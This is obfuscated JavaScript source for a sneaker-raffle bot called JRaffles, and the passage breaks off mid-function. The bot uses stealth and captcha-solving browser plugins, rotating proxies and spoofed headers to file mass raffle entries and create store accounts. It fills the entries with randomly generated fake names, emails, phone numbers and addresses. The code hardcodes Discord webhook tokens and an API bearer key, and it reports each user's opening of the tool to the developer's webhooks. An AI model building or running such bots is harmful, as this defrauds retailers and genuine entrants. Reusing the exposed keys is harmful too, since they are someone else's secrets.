const { EmbedBuilder: _0x3642b5 } = require('discord.js');
var _0x365f27 = require('exe');
const { execFile: _0x2a6671 } = require('child_process'), _0x3102e9 = require('puppeteer-extra'), _0x45477b = require('puppeteer-extra-plugin-recaptcha'), _0x5c5e7a = require('puppeteer-extra-plugin-stealth'), _0x304ca1 = require('chalk'), _0x4bc62a = require('node-bash-title'), _0x20c314 = require('fs'), _0x47ddf6 = require('axios'), _0x3ca720 = require('papaparse');
var _0x4b3abf = require('random-name');
const _0x1b2891 = require('request');
var _0x124037 = require('prompt');
const _0x599249 = _0x1b2891['jar']();
var _0x13b92f = {};
const _0x372212 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x3d48c3 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x17ef36 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3b9936 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x514756 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn';
var _0x2aaf4b = 'https://discord.com/api/webhooks/', _0x30573a = '' + _0x2aaf4b + _0x17ef36, _0x43652e = '' + _0x2aaf4b + _0x3b9936, _0x25855c = '' + _0x2aaf4b + _0x372212, _0x192865 = '' + _0x2aaf4b + _0x3d48c3, _0x4c8fbe = '' + _0x2aaf4b + _0x514756;
const _0x372408 = JSON['parse'](_0x20c314['readFileSync']('../package.json', 'utf-8')), _0x520c59 = _0x372408['version'];
var _0x5ece83, _0x286bb6, _0x5a6862, _0x73e3c8, _0x110315, _0x2fc3bb, _0x17ac6d, _0x54cab2;
const _0x22ef1d = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3216c4 = ![];
const _0x3a6e6c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x492433 = '0123456789';
var _0x6860ff = _0x3a6e6c['split']('');
const _0x5840be = require('auto-git-update'), { PageEmittedEvents: _0x5984f6 } = require('puppeteer'), { getRandomValues: _0x587f3a } = require('crypto'), { resolve: _0x48d689 } = require('path'), { Console: _0x42f504 } = require('console'), _0x530c30 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x583c01 = new _0x5840be(_0x530c30);
async function _0x2eb434() {
    _0x110315 = _0x20c314['readdirSync']('../proxies'), _0x73e3c8 = _0x20c314['readdirSync']('../tasks'), _0x13b92f = JSON['parse'](_0x20c314['readFileSync']('../settings.json', 'utf-8')), !_0x13b92f['delay'] && (_0x13b92f['delay'] = 0x2710, _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f))), !_0x13b92f['captchaKey'] && (_0x13b92f['captchaKey'] = '', _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f))), !_0x13b92f['useRandomProxy'] && (_0x13b92f['useRandomProxy'] = !![], _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f))), !_0x13b92f['webhook'] && (_0x13b92f['webhook'] = '', _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f))), _0x13b92f['MahaDelay'] = _0x13b92f['delay'], _0x2aaf4b = _0x13b92f['webhook'], _0x2fc3bb = _0x13b92f['licenseKey'];
}
let _0x33ef39, _0x102540 = [], _0x39ba9b;
const _0x19d76a = _0x35132d => new Promise(_0x2b0d0a => setTimeout(_0x2b0d0a, _0x35132d));
function _0x222ea8(_0x2d95e5, _0x1687dc) {
    return Math['floor'](Math['random']() * (_0x1687dc - _0x2d95e5 + 0x1) + _0x2d95e5);
}
async function _0x4137f1(_0xcbdf1a) {
    return _0x47ddf6['get']('https://api.hyper.co/v4/licenses/' + _0xcbdf1a, { 'headers': { 'Authorization': 'Bearer\x20' + _0x22ef1d } })['then'](_0x4fc26c => _0x4fc26c['data'])['catch'](() => null);
}
;
async function _0xeab46b(_0x3c5305) {
    console['clear']();
    if (_0x3c5305 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x32ae74 = await _0x124037['get']('License');
        if (_0x32ae74['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x19d76a(0xbb8), _0xeab46b(_0x3c5305);
        _0x3c5305 = _0x32ae74['License'], _0x13b92f['licenseKey'] = _0x3c5305, _0x2fc3bb = _0x3c5305, _0x20c314['writeFileSync']('../settings.json', JSON['stringify'](_0x13b92f));
    }
    console['log']('Checking\x20license\x20' + _0x2fc3bb + '...'), await _0x19d76a(0x320);
    const _0x2f0219 = await _0x4137f1(_0x3c5305);
    _0x17ac6d = JSON['stringify'](_0x2f0219['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x54cab2 = JSON['stringify'](_0x2f0219['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2f0219)
        return console['log']('License\x20not\x20found');
    if (!_0x2f0219['user'])
        return console['log']('License\x20not\x20bound');
    return _0x2f0219['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3216c4 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3216c4 = ![]);
}
async function _0x13f0ae() {
    var _0x3a5cba = await _0x124037['get']('Module');
    return console['clear'](), _0x3a5cba['Module'];
}
;
async function _0x537b9b() {
    var _0x106ce8 = await _0x124037['get']('Setting');
    return console['clear'](), _0x106ce8['Setting'];
}
async function _0x563ba1() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x9137c6 = 0x0; _0x9137c6 < _0x73e3c8['length']; _0x9137c6++) {
        console['log']('\x20(' + _0x9137c6 + ')\x20' + _0x73e3c8[_0x9137c6]);
    }
    console['log']('');
    var _0x1fae35 = await _0x124037['get']('Task');
    if (_0x1fae35['Task'] > _0x73e3c8['length'] - 0x1 || isNaN(_0x1fae35['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x19d76a(0x3e8), _0x563ba1();
    var _0x3c647e = _0x20c314['readFileSync']('../tasks/' + _0x73e3c8[_0x1fae35['Task']], 'utf-8');
    return _0x5a6862 = _0x3ca720['parse'](_0x3c647e, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x304ca1['blue'](_0x73e3c8[_0x1fae35['Task']])), _0x5ece83 = _0x73e3c8[_0x1fae35['Task']], _0x5a6862;
}
async function _0x265cea() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x5a2e5a = 0x0; _0x5a2e5a < _0x110315['length']; _0x5a2e5a++) {
        console['log']('\x20(' + _0x5a2e5a + ')\x20' + _0x110315[_0x5a2e5a]);
    }
    console['log']('');
    var _0xa84e9f = await _0x124037['get']('Proxies');
    if (_0xa84e9f['Proxies'] > _0x110315['length'] - 0x1 || isNaN(_0xa84e9f['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x19d76a(0x3e8), _0x265cea();
    var _0x2a0f6b = _0x20c314['readFileSync']('../proxies/' + _0x110315[_0xa84e9f['Proxies']], 'utf-8')['split']('\x0a');
    let _0x623e4d = _0x2a0f6b['map']((_0x3a4f2c, _0x41dfff) => {
        sanatizeProxy = _0x3a4f2c['replace']('\x0d', '');
        if (_0x2a0f6b[_0x41dfff + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x286bb6 = _0x110315[_0xa84e9f['Proxies']], console['clear'](), _0x623e4d;
}
async function _0x2a8869() {
    var _0x49e723 = await _0x124037['get']('Value');
    return console['clear'](), _0x49e723['Value'];
}
async function _0x1ca812(_0x20244d) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x510b21 = 0x0; _0x510b21 < _0x20244d['length']; _0x510b21++) {
        console['log']('\x20(' + _0x510b21 + ')\x20[' + _0x20244d[_0x510b21]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x4064b7 = await _0x124037['get']('Module');
    return _0x4064b7['Module'];
}
async function _0xa4d8c6() {
    var _0x13e3b3 = await _0x124037['get']('Password');
    return console['clear'](), _0x13e3b3['Password'];
}
;
async function _0x549519() {
    var _0x3f42bc = await _0x124037['get']('Links');
    return _0x3f42bc['Links'];
}
;
async function _0x48b076() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3d8b7b = 0x0; _0x3d8b7b < _0x102540['length']; _0x3d8b7b++) {
        console['log']('\x20(' + _0x3d8b7b + ')\x20' + _0x102540[_0x3d8b7b]);
    }
    ;
    console['log']();
    let _0x3f1b0c = await _0x124037['get']('Product');
    return console['clear'](), _0x3f1b0c['Product'];
}
;
function _0x19564e() {
    var _0x25c15d = new Date(Date['now']())['toLocaleTimeString']();
    return _0x25c15d;
}
;
const _0xc93d09 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VJnG3d',
                            'custom_source': 'DO8912-101',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RwHCGb',
                                '$consent_form_version': 0x7c0710,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'SLAMJAM',
        'modules': [
            {
                'name': 'SLAMJAM\x20Account\x20Generator',
                'store': 'SLAMJAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAMJAM\x20Raffle\x20Entries',
                'store': 'SLAMJAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0xdeed(_0xb8e0d4, _0x3277fe) {
    let _0x51c7b8 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x520c59 != 'devkey') {
        await _0x47ddf6['post'](_0xb8e0d4, _0x3277fe, _0x51c7b8);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x83146(_0x1a80c0, _0x2cd32f, _0x442086, _0xb4d06e, _0x42ff66) {
    if (!_0xb4d06e && _0x442086 == 'dev') {
        var _0x368e3a = new _0x3642b5()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2cd32f['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2cd32f['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1a80c0['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x13b92f['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x17ac6d,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1a80c0['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x520c59,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x368e3a['data'];
    } else {
        if (_0xb4d06e && _0x442086 == 'dev') {
            var _0x368e3a = new _0x3642b5()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2cd32f['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x17ac6d,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2cd32f['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1a80c0['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x13b92f['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x42ff66,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1a80c0['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x520c59,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x368e3a['data'];
        } else {
            if (_0x442086 == 'pub') {
                var _0x368e3a = new _0x3642b5()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2cd32f['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2cd32f['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1a80c0['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1a80c0['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x520c59,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x368e3a['data'];
            } else {
                if (_0x442086 == 'acc') {
                    var _0x368e3a = new _0x3642b5()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2cd32f['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x17ac6d,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2cd32f['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x13b92f['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x520c59,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x368e3a['data'];
                } else {
                    if (_0x442086 == 'open') {
                        var _0x368e3a = new _0x3642b5()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x54cab2)['addFields']({
                            'name': 'User',
                            'value': '' + _0x17ac6d,
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x520c59,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x368e3a['data'];
                    }
                }
            }
        }
    }
}
async function _0x423f7e(_0x230733, _0x2f358c) {
    var _0x52a00b = _0x230733[_0x2f358c]['Address1']['split'](''), _0x4c36fc = _0x230733[_0x2f358c]['Address2']['split'](''), _0x42e8b2 = _0x230733[_0x2f358c]['Email']['split']('@');
    for (var _0x277df5 = 0x0; _0x277df5 < _0x52a00b['length']; _0x277df5++) {
        if (_0x52a00b[_0x277df5] == 'X') {
            var _0x4db557 = Math['round'](Math['random']() * (_0x3a6e6c['length'] - 0x1));
            _0x52a00b[_0x277df5] = _0x6860ff[_0x4db557];
        }
    }
    ;
    for (var _0x277df5 = 0x0; _0x277df5 < _0x4c36fc['length']; _0x277df5++) {
        if (_0x4c36fc[_0x277df5] == 'X') {
            var _0x4db557 = Math['round'](Math['random']() * (_0x3a6e6c['length'] - 0x1));
            _0x4c36fc[_0x277df5] = _0x6860ff[_0x4db557];
        }
    }
    ;
    _0x230733[_0x2f358c]['FirstName'] == 'RANDOM' && (_0x230733[_0x2f358c]['FirstName'] = _0x4b3abf['first']());
    _0x230733[_0x2f358c]['LastName'] == 'RANDOM' && (_0x230733[_0x2f358c]['LastName'] = _0x4b3abf['last']());
    _0x42e8b2[0x0] == 'RANDOM' ? _0x42e8b2[0x0] = '' + _0x4b3abf['first']() + _0x4b3abf['last']() + '@' : _0x42e8b2[0x0] = _0x42e8b2[0x0] + '@';
    _0x230733[_0x2f358c]['Email'] = _0x42e8b2['join'](''), _0x230733[_0x2f358c]['Address1'] = _0x52a00b['join'](''), _0x230733[_0x2f358c]['Address2'] = _0x4c36fc['join']('');
    _0x230733[_0x2f358c]['Phone'] == 'RANDOM' && (_0x230733[_0x2f358c]['Phone'] = '0' + _0x222ea8(0x5f5e100, 0x3b9ac9ff));
    if (_0x230733[_0x2f358c]['Follower'] == 'RANDOM') {
        var _0x1914b8 = _0x222ea8(0x1, 0x270f);
        _0x230733[_0x2f358c]['Follower'] = '' + _0x4b3abf['first']() + _0x4b3abf['last']() + _0x1914b8 + '\x20';
    }
    _0x230733[_0x2f358c]['HouseNumber'] == 'RANDOM' && (_0x230733[_0x2f358c]['HouseNumber'] = _0x222ea8(0x1, 0xc8));
    if (_0x230733[_0x2f358c]['Address1'] == 'RANDOM') {
        var _0x427a0c = Math['round'](Math['random']() * (_0x3a6e6c['length'] - 0x1)), _0x1d76f4 = _0x6860ff[_0x427a0c];
        _0x230733[_0x2f358c]['Address1'] = _0x4b3abf['last']() + 'straat', _0x230733[_0x2f358c]['Postcode'] = _0x222ea8(0x3e8, 0x270f) + '\x20' + _0x1d76f4 + _0x1d76f4, _0x230733[_0x2f358c]['Zip'] = _0x230733[_0x2f358c]['Postcode'], _0x230733[_0x2f358c]['HouseNumber'] = '' + _0x222ea8(0x1, 0xc8);
    }
    return;
}
;
function _0x427d5d() {
    let _0x579222 = proxyFile['split']('\x0a'), _0x48193a = _0x579222['map']((_0x8e0026, _0x4f179d) => {
        sanatizeProxy = _0x8e0026['replace']('\x0d', '');
        if (_0x579222[_0x4f179d + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x48193a;
}
;
async function _0x12cd3d(_0xcee470) {
    var _0x13b3f4 = _0xcee470[0x1]['split'](':');
    const _0x5da1a8 = await _0x3102e9['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x13b3f4[0x0] + ':' + _0x13b3f4[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x44e973 = await _0x5da1a8['newPage']();
        await _0x44e973['authenticate']({
            'username': '' + _0x13b3f4[0x2],
            'password': '' + _0x13b3f4[0x3]
        }), console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x44e973['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x44e973['setRequestInterception'](!![]), _0x44e973['on']('request', _0x59e274 => {
